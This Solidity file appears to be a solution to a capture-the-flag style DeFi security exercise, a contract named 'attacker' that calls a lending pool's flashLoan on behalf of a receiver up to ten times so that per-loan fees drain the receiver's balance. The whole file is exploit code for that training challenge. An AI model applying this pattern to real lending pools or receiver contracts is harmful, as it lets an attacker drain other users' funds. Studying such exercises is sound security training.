// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

contract attacker {

    // using Address for address;

    address public borrower;
    address payable public poolAddress;

    constructor(address borrowerAddress, address payable _poolAddress) {
        borrower = borrowerAddress;
        poolAddress = _poolAddress;
    }

    function attack() public {

        uint256 bal_receiver = borrower.balance;

        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddress);


        for (uint256 index = 0; index < 10; index++) {
            
            // pool.functionCall(abi.encodeWithSignature("flashLoan(address, uint256)", borrower, 50));
            
            pool.flashLoan(borrower, 0);
            bal_receiver = borrower.balance;

            if (bal_receiver == 0) {
              return;  
            }

        }
        return;
    }


}